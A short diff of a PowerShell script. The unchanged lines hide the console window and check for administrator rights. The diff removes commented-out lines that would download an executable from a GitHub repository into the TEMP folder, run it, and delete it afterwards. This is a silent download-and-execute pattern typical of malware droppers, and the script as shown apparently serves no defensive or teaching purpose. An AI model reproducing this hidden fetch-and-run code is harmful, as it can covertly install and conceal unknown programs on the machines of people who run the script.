@@ -14,12 +14,6 @@ $consolePtr = [ConsoleWindow]::GetConsoleWindow()
 
 [ConsoleWindow]::ShowWindow($consolePtr, [ConsoleWindow]::SW_HIDE)
 
-# url = "https://github.com/Gabkill54/Kidou-Software/raw/main/Test.exe"
-# $output = "$env:TEMP\Test.exe"
-# Invoke-WebRequest -Uri $url -OutFile $output
-# Start-Process $output -Wait
-# Remove-Item $output
-
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
 
 if (-not $isAdmin) {
